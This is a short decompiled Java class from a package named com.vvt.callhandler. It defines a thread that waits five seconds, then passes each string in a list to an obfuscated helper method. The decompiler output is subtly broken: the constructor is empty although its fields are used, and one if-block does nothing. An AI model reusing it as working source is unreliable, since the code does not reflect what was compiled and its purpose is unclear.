package com.vvt.callhandler;

import android.os.SystemClock;
import com.vvt.ae.f;
import java.util.Iterator;
import java.util.List;

class e
  extends Thread
{
  e(c paramc, List paramList, String paramString) {}
  
  public void run()
  {
    long l = 5000L;
    SystemClock.sleep(l);
    Object localObject = this.a;
    Iterator localIterator = ((List)localObject).iterator();
    for (;;)
    {
      boolean bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = (String)localIterator.next();
      boolean bool2 = c.e();
      if (bool2) {}
      f localf = c.d(this.c);
      String str = this.b;
      localf.a((String)localObject, str);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */